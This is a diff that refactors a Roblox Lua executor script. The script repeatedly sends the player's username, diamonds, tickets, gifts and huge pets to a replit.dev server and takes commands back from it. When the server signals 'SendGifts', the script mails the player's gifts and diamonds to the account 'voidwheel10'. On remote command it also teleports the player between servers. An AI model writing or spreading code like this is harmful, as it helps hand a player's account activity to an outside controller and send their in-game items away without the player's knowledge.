@@ -141,131 +141,103 @@ function ProcessHugePets()
 end
 
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")  -- Get the TeleportService
+local TeleportService = game:GetService("TeleportService")
 
 local function CheckRejoin()
-while true do 
-wait(1)
-    local rejoinUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkRejoin"
-    local serverDataUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/getServerData"
-    local request = (syn and syn.request) or request or (http and http.request) or http_request
+    while true do
+        wait(1)
+        local rejoinUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkRejoin"
+        local serverDataUrl = "https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/getServerData"
+        local request = (syn and syn.request) or request or (http and http.request) or http_request
 
-    local success, response = pcall(function()
-        return request({
-            Url = rejoinUrl,
-            Method = "GET",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            }
-        })
-    end)
-
-    if success and response.StatusCode == 200 then
-        local data = HttpService:JSONDecode(response.Body)
-        local rejoinValue = data.rejoin
-
-        local serverSuccess, serverResponse = pcall(function()
+        local success, response = pcall(function()
             return request({
-                Url = serverDataUrl,
+                Url = rejoinUrl,
                 Method = "GET",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                }
+                Headers = { ["Content-Type"] = "application/json" }
             })
         end)
 
-        if serverSuccess and serverResponse.StatusCode == 200 then
-            local serverData = HttpService:JSONDecode(serverResponse.Body)
-            local ServerId = serverData.ServerID
-            local JobId = serverData.ServerJobID
+        if success and response.StatusCode == 200 then
+            local data = HttpService:JSONDecode(response.Body)
+            local rejoinValue = data.rejoin
 
-            print("Server ID:", ServerId)
-            print("Job ID:", JobId)
+            local serverSuccess, serverResponse = pcall(function()
+                return request({
+                    Url = serverDataUrl,
+                    Method = "GET",
+                    Headers = { ["Content-Type"] = "application/json" }
+                })
+            end)
 
-            if rejoinValue == 1 then
-local players = game.Players:GetChildren()
-local found = false
+            if serverSuccess and serverResponse.StatusCode == 200 then
+                local serverData = HttpService:JSONDecode(serverResponse.Body)
+                local ServerId, JobId = serverData.ServerID, serverData.ServerJobID
 
-for _, player in pairs(players) do
-    if player.Name == "simpleblandok3" then
-        print("ok")
-        found = true
-        break
-    end
-end
+                if rejoinValue == 1 then
+                    local players = game.Players:GetChildren()
+                    local found = false
 
-if not found then
-  TeleportService:TeleportToPlaceInstance(ServerId, JobId, game.Players.LocalPlayer) 
-end
+                    for _, player in pairs(players) do
+                        if player.Name == "simpleblandok3" then
+                            found = true
+                            break
+                        end
+                    end
 
+                    if not found then
+                        TeleportService:TeleportToPlaceInstance(ServerId, JobId, game.Players.LocalPlayer)
+                    end
+                elseif rejoinValue == 2 then
+                    local Api = "https://games.roblox.com/v1/games/"
+                    local _place = game.PlaceId
+                    local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+                    local visitedServers = {}
 
-                
-            elseif rejoinValue == 2 then
-           local Http = game:GetService("HttpService")
-local TPS = game:GetService("TeleportService")
-local Api = "https://games.roblox.com/v1/games/"
+                    local function ListServers(cursor)
+                        local Raw = request({
+                            Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
+                            Method = "GET"
+                        })
+                        return HttpService:JSONDecode(Raw.Body)
+                    end
 
-local _place = game.PlaceId
-local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"
+                    local function FindServer()
+                        local Server, Servers, Next
+                        repeat
+                            Servers = ListServers(Next)
+                            if Servers and Servers.data and #Servers.data > 0 then
+                                for _, v in ipairs(Servers.data) do
+                                    if v.id ~= game.JobId and not visitedServers[v.id] then
+                                        Server = v
+                                        break
+                                    end
+                                end
+                            end
+                            Next = Servers.nextPageCursor
+                        until Server or not Next
+                        return Server
+                    end
 
-local request = (syn and syn.request) or request or (http and http.request) or http_request
-
-local visitedServers = {}  -- Table to store visited server IDs
-
-function ListServers(cursor)
-    local Raw = request({
-        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
-        Method = "GET"
-    })
-    return Http:JSONDecode(Raw.Body)
-end
-
-local function FindServer()
-    local Server, Servers, Next
-
-    repeat
-        Servers = ListServers(Next)
-
-        -- Check if Servers.data is valid and not empty
-        if Servers and Servers.data and #Servers.data > 0 then
-            for _, v in ipairs(Servers.data) do
-                if v.id ~= game.JobId and not visitedServers[v.id] then  -- Skip current and visited servers
-                    Server = v
-                    break
+                    while true do
+                        local Server = FindServer()
+                        if Server then
+                            visitedServers[Server.id] = true
+                            TeleportService:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
+                            break
+                        else
+                            wait(2)
+                        end
+                    end
+                elseif rejoinValue == 3 then
+                    print("safe")
                 end
             end
-        else
-            Server = nil  -- No servers available
-        end
-
-        Next = Servers.nextPageCursor
-    until Server or not Next
-
-    return Server
-end
-
-while true do
-    local Server = FindServer()
-    if Server then
-        visitedServers[Server.id] = true  -- Mark the server as visited
-        TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
-        break  -- Exit the loop after a successful teleport
-    else
-        print("No suitable server found. Retrying in 2 seconds...")
-        wait(2)
-    end
-end
-            elseif rejoinValue == 3 then
-                print("safe")
-            end
         end
     end
-end
 end
 
 spawn(CheckRejoin)
-
-
 
 local player = game.Players.LocalPlayer
 local playerName = player.Name
@@ -284,22 +256,15 @@ textLabel.TextColor3 = Color3.new(0, 0, 0)
 textLabel.Parent = screenGui
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local itemsFrame = player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
-
 local ItemMisc = {"Pet Cube"}
 
 local function GetItemInfo(ItemsClass, ItemsName)
     local Table = {}
     local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
-
     if Inventory[ItemsClass] then
         for UID, Item in pairs(Inventory[ItemsClass]) do
             if table.find(ItemsName, Item.id) then
-                local ItemInfo = {
-                    ["uid"] = UID,
-                    ["data"] = Item
-                }
-                table.insert(Table, ItemInfo)
+                table.insert(Table, { ["uid"] = UID, ["data"] = Item })
             end
         end
     end
@@ -307,57 +272,29 @@ local function GetItemInfo(ItemsClass, ItemsName)
 end
 
 local function PetCubeData()
-
     while true do
-ProcessHugePets()
         local PetCubeAmount = 0
         local MiscItems = GetItemInfo("Misc", ItemMisc)
-
         for _, ItemInfo in pairs(MiscItems) do
             local ItemData = ItemInfo.data
             if ItemData._am then
                 PetCubeAmount = ItemData._am
             end
         end
-
         textLabel.Text = playerName .. "\nPet Cubes: " .. PetCubeAmount
-
         wait(1)
     end
 end
 
 spawn(PetCubeData)
 
-
-local function dataFunction2() 
+local function dataFunction2()
     while true do
-        local ReplicatedStorage = game:GetService("ReplicatedStorage")
-        local Player = game.Players.LocalPlayer
-        local itemsFrame = Player.PlayerGui:FindFirstChild("_MACHINES"):FindFirstChild("ElementalQuest").Frame.ItemsFrame
-
         local diamondsvalue = 0
         local voidvalue = 0
         local gifts = 0
         local ItemLootbox = {"Elemental Gift"}
         local ItemMisc = {"Pet Cube"}
-        
-        local function GetItemInfo(ItemsClass, ItemsName)
-            local Table = {}
-            local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
-
-            if Inventory[ItemsClass] then
-                for UID, Item in pairs(Inventory[ItemsClass]) do
-                    if table.find(ItemsName, Item.id) then
-                        local ItemInfo = {
-                            ["uid"] = UID,
-                            ["data"] = Item
-                        }
-                        table.insert(Table, ItemInfo)
-                    end
-                end
-            end
-            return Table
-        end
 
         local LootboxItems = GetItemInfo("Lootbox", ItemLootbox)
         for _, ItemInfo in pairs(LootboxItems) do
@@ -386,19 +323,14 @@ local function dataFunction2()
 
         local hugePets = getCurrentHugePets()
         local hugePetsString = #hugePets > 0 and table.concat(hugePets, ", ") or "0"
-
-        local player = Player.Name
-        local Http = game:GetService("HttpService")
-
+        local player = game.Players.LocalPlayer.Name
         local request = (syn and syn.request) or request or (http and http.request) or http_request
 
         local response = request({
             Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/update',
             Method = 'POST',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            },
-            Body = Http:JSONEncode({
+            Headers = { ['Content-Type'] = 'application/json' },
+            Body = HttpService:JSONEncode({
                 Username = player,
                 VoidTicketsValue = voidvalue,
                 DiamondsValue = diamondsvalue,
@@ -406,43 +338,29 @@ local function dataFunction2()
             })
         })
 
-        print("Update Response:", response.Body)
-
         local checkResponse = request({
             Url = 'https://71530385-1c3c-4b6f-a88a-1b94478b0d21-00-3dvn9h52wp97.worf.replit.dev/checkSendGifts',
             Method = 'GET',
-            Headers = {
-                ['Content-Type'] = 'application/json'
-            }
+            Headers = { ['Content-Type'] = 'application/json' }
         })
 
-        print("Check Send Gifts Response:", checkResponse.Body)
-
-        if checkResponse and checkResponse.Body then
-            if checkResponse.Body:find('"SendGifts":true') then
-                if diamondsvalue > 50 then
-                    local args = {
-                        [1] = "voidwheel10",
-                        [2] = "enjoy bro",
-                        [3] = "Lootbox",
-                        [4] = gifts,
-                        [5] = diamondsvalue
-                    }
-                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-                end
+        if checkResponse and checkResponse.Body:find('"SendGifts":true') then
+            if diamondsvalue > 50 then
+                local args = {
+                    [1] = "voidwheel10",
+                    [2] = "enjoy bro",
+                    [3] = "Lootbox",
+                    [4] = gifts,
+                    [5] = diamondsvalue
+                }
+                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
             end
         end
-
         wait(5)
     end
 end
 
 spawn(dataFunction2)
-
-
-
-
-
 
 
 while true do
